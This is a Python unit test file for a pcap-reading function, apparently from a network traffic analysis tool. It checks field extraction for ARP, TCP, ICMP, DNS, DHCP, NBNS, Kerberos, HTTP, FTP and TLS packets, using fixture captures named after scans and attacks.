class TestPcapread(unittest.TestCase):
    def test_arp_fields(self):
        packets = read_pcap(_p("arp_spoof"))
        arps = [p for p in packets if p.proto == "arp"]
        self.assertTrue(arps)
        first = arps[0]
        self.assertIn("arp.opcode", first.fields)
        self.assertIn("arp.src.proto_ipv4", first.fields)

    def test_tcp_flag_decomposition(self):
        packets = read_pcap(_p("nmap_connect"))
        syn = next(p for p in packets if p.fields.get("tcp.flags.syn") == 1
                   and p.fields.get("tcp.flags.ack") == 0)
        self.assertEqual(syn.fields["tcp.flags.fin"], 0)
        self.assertEqual(syn.fields["tcp.flags.reset"], 0)

    def test_icmp_unreachable_encapsulation(self):
        packets = read_pcap(_p("nmap_udp"))
        unreachable = next(p for p in packets if p.fields.get("icmp.type") == 3)
        self.assertIn("icmp.orig.udp.dstport", unreachable.fields)

    def test_dns_fields(self):
        packets = read_pcap(_p("dns_tunnel"))
        q = next(p for p in packets if "dns.qry.name" in p.fields)
        self.assertGreaterEqual(q.fields["dns.qry.name.len"], 40)

    def test_dhcp_hostname_and_nbns(self):
        packets = read_pcap(_p("dhcp_nbns_kerberos"))
        self.assertTrue(any(p.fields.get("dhcp.option.hostname") == "WIN-016" for p in packets))
        self.assertTrue(any(p.fields.get("nbns.name") == "WIN-016" for p in packets))

    def test_kerberos_fallback_extraction(self):
        packets = read_pcap(_p("dhcp_nbns_kerberos"))
        krb = [p for p in packets if p.fields.get("kerberos")]
        self.assertTrue(krb)
        f = krb[0].fields
        self.assertEqual(f.get("kerberos.realm"), "CORP.LOCAL")
        self.assertIn("jdoe", f.get("kerberos.CNameString", ""))

    def test_http_request_and_response(self):
        packets = read_pcap(_p("http_traffic"))
        req = next(p for p in packets if p.fields.get("http.request"))
        self.assertEqual(req.fields["http.request.method"], "GET")
        resp = next(p for p in packets if p.fields.get("http.response"))
        self.assertIn("http.response.code", resp.fields)

    def test_ftp_request_and_response(self):
        packets = read_pcap(_p("ftp_bruteforce"))
        self.assertTrue(any(p.fields.get("ftp.request.command") == "USER" for p in packets))
        self.assertTrue(any(p.fields.get("ftp.response.code") == 530 for p in packets))

    def test_tls_sni_and_unusual_port(self):
        packets = read_pcap(_p("tls_handshake"))
        std = next(p for p in packets if p.dst_port == 443)
        self.assertEqual(std.fields.get("tls.handshake.extensions_server_name"), "www.example.com")
        odd = next(p for p in packets if p.dst_port == 8081)
        self.assertEqual(odd.fields.get("tls.handshake.type"), 1)

    def test_malformed_frame_does_not_crash_the_read(self):
        # read_pcap must never raise on a single bad frame -- isolation, not
        # a hard failure, matches the detector-isolation contract.
        packets = read_pcap(_p("clean_baseline"))
        self.assertTrue(len(packets) > 0)


